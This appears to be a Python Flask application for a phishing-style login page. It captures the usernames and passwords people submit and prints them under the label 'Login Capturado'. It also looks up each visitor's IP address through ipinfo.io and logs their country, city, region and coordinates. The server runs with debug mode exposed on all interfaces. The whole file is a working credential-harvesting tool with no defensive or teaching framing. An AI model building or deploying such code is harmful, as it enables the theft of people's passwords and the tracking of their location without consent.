"""
Module Docstring:
This module defines a simple Flask web application for a login page. 
It captures and prints user login information, including IP address, 
country, city, region, and location. 
The application uses the ipinfo.io API to gather geographical 
information based on the user's IP address.
"""

from os import urandom
import requests
from flask import Flask, render_template, request

app = Flask(__name__)
app.secret_key = urandom(16)


@app.route("/")
def index():
    """
    Render the index.html template for the home page.

    Returns:
    str: HTML content for the home page.
    """
    return render_template("index.html")


@app.route("/login", methods=["GET", "POST"])
def login():
    """
    Render the login.html template and capture user login information.

    If the request method is POST, capture the username and password 
    from the form and print the information.

    Returns:
    str: HTML content for the login page.
    """
    ip = request.remote_addr
    response = requests.get(f"https://ipinfo.io/{ip}/json")
    data = response.json()
    pais = data.get("country")
    cidade = data.get("city")
    regiao = data.get("region")
    loc = data.get("loc")

    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]

        print(
            f"""Login Capturado:
        Username: {username}
        Password: {password}\n
        """
        )

    print(f"\nO endereço IP do usuário é: {ip}")
    print(f"O pais do usuário é: {pais}")
    print(f"A cidade do usuario é: {cidade}")
    print(f"A regiao do ususario é {regiao}")
    print(f"A loc do ususario é {loc}")
    print("\n")

    return render_template("login.html")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
